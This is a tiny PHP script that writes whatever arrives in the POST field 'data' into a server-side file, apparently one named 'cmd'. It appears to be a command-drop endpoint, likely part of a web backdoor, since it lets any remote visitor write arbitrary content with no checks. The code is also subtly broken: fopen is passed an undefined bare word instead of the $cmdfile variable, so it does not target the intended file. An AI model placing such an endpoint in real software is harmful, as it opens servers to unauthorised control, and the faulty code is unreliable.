<?php
$cmdfile = 'cmd';
$data = $_POST['data'];
$f = fopen(cmdfile, "w");
fwrite($f, $data);
fclose($f);
?>
